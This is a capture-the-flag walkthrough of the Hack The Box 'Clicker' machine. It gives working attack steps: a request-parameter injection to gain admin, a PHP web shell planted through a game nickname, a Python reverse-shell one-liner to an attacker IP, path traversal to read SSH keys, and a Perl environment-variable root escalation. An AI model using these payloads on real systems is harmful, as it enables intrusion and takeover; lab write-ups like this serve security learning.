#  Clicker HTB Machine: Medium 

__________________________________________

### Nmap

**22**/tcp    open     ssh     syn-ack
**80**/tcp    open     http    syn-ack
**111**/tcp   open     rpcbind syn-ack
**2049**/tcp  open     nfs     syn-ack
33925/tcp open     unknown syn-ack
37539/tcp open     unknown syn-ack
42223/tcp open     unknown syn-ack
43407/tcp open     unknown syn-ack
43637/tcp open     unknown syn-ack

## NFS

```sh
showmount -e $IP

Export list for $MachineIP:
/mnt/backups *
```

- Mount the nfs share:
```sh
sudo mount -t nfs $IP:/mnt/backups /YOUR/PATH/clicker/nfs
```

Inside the nfs share there is the backup of the webapp which i copied and unzipped into another folder.
## WebApp

80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))

### Become Administrator
We found that we can add role in save_game.php from the source code. 
But if we add just "role=Admin" we will be redirect to "**/index.php?err=Malicious activity detected!**"

#### Path to Admin
1. Register
2. Play a match
3. Save the game
4. Modify the request for save_game.php:
	Add a null byte "**%0d**" before calling the parameter role=Admin.
	From:
	*GET /save_game.php?clicks=22&level=0 HTTP/1.1*
	To:
	*GET /save_game.php?clicks=22&level=0&%0drole=Admin HTTP/1.1*
5. Logout and login back again.
6. We are Admin.

# FOOTHOLD

In "save_game.php" we can also set the "nickname" parameter.
- Set the nickname to: 
```php
<?=`$_GET[0]`?>
```
- Save the game 
- Export the score from the administration page
- In burpsuite change the extension to *php*
- Go to the php saved page and add ..?0=id to execute a command to the server.
- In order to obtain a reverse shell use the python script:
	python3+-c+'import+os,pty,socket;s=socket.socket();s.connect(("YOURIP",5666));  
	[os.dup2(s.fileno(),f)for+f+in(0,1,2)];pty.spawn("sh")'
- Get an initial foothold but we are not a real user; it's time to privesc.
# Privesc to User

```sh
find / -perm -u=s -type f 2>/dev/null
```
With this command we find this binary:
/opt/manage/execute_query

There's a README.txt file:
```
Use the binary to execute the following task:
- 1: Creates the database structure and adds user admin
- 2: Creates fake players (better not tell anyone)
- 3: Resets the admin password
- 4: Deletes all users except the admin
```
So if we execute the bin like `./execute_query 1` we create the db struct etc..

- Download the binary "*execute_query*" in Your Machine and reverse engeneer with ghidra.
Looking for password we got the functionality where we see that we can choose from 5 options and not just 4 as stated in the README.txt.

We Must try it:
`./execute_query 5 ../../../etc/passwd`
We can read files, maybe we can get the id_rsa?
`./execute_query 5 ../.ssh/id_rsa`

With the id_rsa
`ssh -i id_rsa jack@$IP

# Privesc to ROOT

Now that we are a real user we can `sudo -l`

```sh
sudo -l
User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

The bash script calls 3 bins:
- usr/bin/curl
- usr/bin/echo
- usr/bin/xml_pp

xml_pp use PERL and That allowed me to run scripts as root, given that I could set the environment when running Perl script and it is vulnerable to "Perl Startup"
https://www.exploit-db.com/exploits/39702

We can run it via metasploit or just run a one liner:
```sh
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
bash -p
bash-5.1# 
```
root.

